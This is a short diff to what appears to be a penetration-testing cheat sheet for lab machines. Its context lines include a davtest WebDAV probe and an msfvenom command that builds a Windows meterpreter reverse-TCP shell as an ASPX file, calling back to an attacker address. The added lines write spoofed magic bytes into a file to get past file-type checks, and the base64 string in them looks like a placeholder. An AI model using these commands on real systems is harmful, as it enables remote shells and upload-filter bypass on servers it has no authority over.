@@ -50,3 +50,6 @@ davtest -url http://10.10.10.15 #For testing webDAV servers
 msfvenom -l | grep windows #search for windows keyword  in payloads
 
 msfvenom -p winodws/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx
+
+echo /asdasd23213sdasdasdwqeqweA= |base64 -d > file #copy the magic bytes, base64 encode it and safe it in a file 
+file file #run this command to find if the file is identified as your prefered one or not.
